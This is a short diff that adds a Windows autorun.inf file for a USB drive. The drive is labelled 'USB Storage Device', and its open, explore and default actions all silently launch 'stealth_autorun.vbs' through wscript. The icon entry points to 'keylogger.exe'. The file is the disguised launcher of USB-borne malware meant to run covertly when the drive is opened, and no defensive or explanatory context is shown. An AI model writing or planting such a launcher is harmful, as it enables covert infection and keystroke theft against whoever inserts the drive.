@@ -1,0 +1,9 @@
+[autorun]
+open=wscript.exe stealth_autorun.vbs
+icon=keylogger.exe
+label=USB Storage Device
+action=Open USB Storage
+shell\open\command=wscript.exe stealth_autorun.vbs
+shell\open\default=1
+shell\explore\command=wscript.exe stealth_autorun.vbs
+shell\explore\default=1 
